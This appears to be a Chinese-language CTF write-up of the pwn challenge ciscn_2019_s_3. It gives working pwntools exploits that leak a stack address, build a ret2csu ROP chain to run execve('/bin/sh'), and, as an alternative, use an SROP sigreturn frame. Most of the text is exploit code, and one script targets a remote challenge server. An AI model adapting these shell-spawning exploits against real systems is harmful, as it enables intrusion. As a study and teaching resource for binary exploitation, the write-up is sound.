---
title: SROP
categories: 
    - Stack
    - SROP
---
# SROP
<!--more-->
## _ciscn_2019_s_3

main里只有一个vuln函数
直接进去看

![205415324135211](https://raw.githubusercontent.com/YTrick/image/branch/image/20201202170418.png)

![202](https://raw.githubusercontent.com/YTrick/image/branch/image/20201202171801.png)

看汇编分析：

需要在栈上构造/bin/sh，并且需要rax=59让64位的syscall执行execve才能getshell

64 位：系统调用号放入 rax，参数依次放到 rdi、rsi、rdx，返回值放在 rax

64位程序前六个寄存器调用顺序：rdi rsi rdx rcx r8 r9

寄存器大概布局：
rax = 59
rdi = /bin/sh
rsi = 0
rdx = 0

注意到vuln函数末尾并没有使用leave指令，即直接把之前push的rbp当作return address
我们要ROP的话offset只需要0x10

先构造/bin/sh在栈中

exp：

```python
from pwn import *
p = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')
context.log_level = 'debug'
vuln_addr = 0x0004004ED
payload = '/bin/sh\x00' + 'A'*0x8 + p64(main_addr)
p.sendline(payload)
p.recv(0x20)
stack_addr = u64(p.recv(8))
print(hex(stack_addr))
```

![20201202211800](https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211800.png)

![20201202211855](https://raw.githubusercontent.com/YTrick/image/branch/image/20201202211855.png)

发现/bin/sh已经在栈中了，在打印到0x20的时候，接下来是打印出来一个地址，这也是为什么需要recv的原因，这个地址是栈上面的，所以只要算出这个地址和/bin/sh地址的相对偏移，就可以在程序每次执行的时候算出binsh的地址了，因为地址会变，但是偏移不会

我们输出了地址stack_addr

计算偏移量 0x7ffdc7824d78 - 0x007FFDC7824C60 = 0x118

所以计算binsh_addr = stack_addr - 0x118

构造完/bin/sh之后，在程序中有给我们一个gadgets函数：

![20201203155951](https://raw.githubusercontent.com/YTrick/image/branch/image/20201203155951.png)

只要我们跳到地址0x4004E2就能把3Bh（59）赋值给rax，这样系统调用号的参数也搞定了

接下来可以利用csu把 rsi = 0，rdx = 0 ，最后用pop rdi ; ret存上/bin/sh就万事大吉了

![20201203161803](https://raw.githubusercontent.com/YTrick/image/branch/image/20201203161803.png)

需要注意的是call这个地方call的是r12地址上的内容，我们这里要call的是mov rax,3Bh ，而mov rax,3Bh可以存在/bin/sh\x00aaaaaaaa(一共长0x10)后面，所以r12 = binsh_addr + 0x10

exp:

```python
from pwn import *

p=remote('node3.buuoj.cn',27933)
#p = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')
context.log_level = 'debug'

main_addr = elf.symbols['main']
vuln_addr = 0x0004004ED

payload = '/bin/sh\x00' + 'A'*0x8 + p64(vuln_addr)
p.sendline(payload)
p.recv(0x20)
stack_addr = u64(p.recv(8))
print(hex(stack_addr))


binsh_addr = stack_addr - 0x118
pop_rbx_rbp_r12_r13_14_r15 = 0x40059A
mov_rdx_r13 = 0x400580
mov_rax_59 = 0x4004E2
pop_rdi = 0x4005a3
syscall_addr = 0x400501

payload = '/bin/sh\x00' + 'A'*0x8 + p64(mov_rax_59) 
payload += p64(pop_rbx_rbp_r12_r13_14_r15) 
payload += p64(0) + p64(1) + p64(binsh_addr+0x10) + p64(0)*3
payload += p64(mov_rdx_r13) + 'a'*(6*8+8) 
payload += p64(pop_rdi) + p64(binsh_addr) + p64(syscall_addr)

p.sendline(payload)
p.interactive()
```

[参考链接](https://www.yuque.com/chenguangzhongdeyimoxiao/xx6p74/edumds)


## SROP

exp:

```python
from pwn import *

p = process('./ciscn_s_3')
context.binary=('./ciscn_s_3')
context.terminal = ['gnome-terminal','-x','sh','-c']

main=0x0004004ED
sigret=0x4004DA
sys=0x400517

pl1='/bin/sh\x00'*2+p64(main)
p.send(pl1)
p.recv(0x20)
sh=u64(p.recv(8))-0x118
print(hex(sh))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = sh
frame.rsi = 0
frame.rdx = 0
frame.rip= sys

pl1='a'*16+p64(sigret)+p64(sys)+str(frame)

pl2='/bin/sh\x00'*2+p64(sigret)+p64(sys)+str(frame)
p.send(pl2)
p.interactive()
```

[参考链接](https://blog.csdn.net/github_36788573/article/details/103541178)


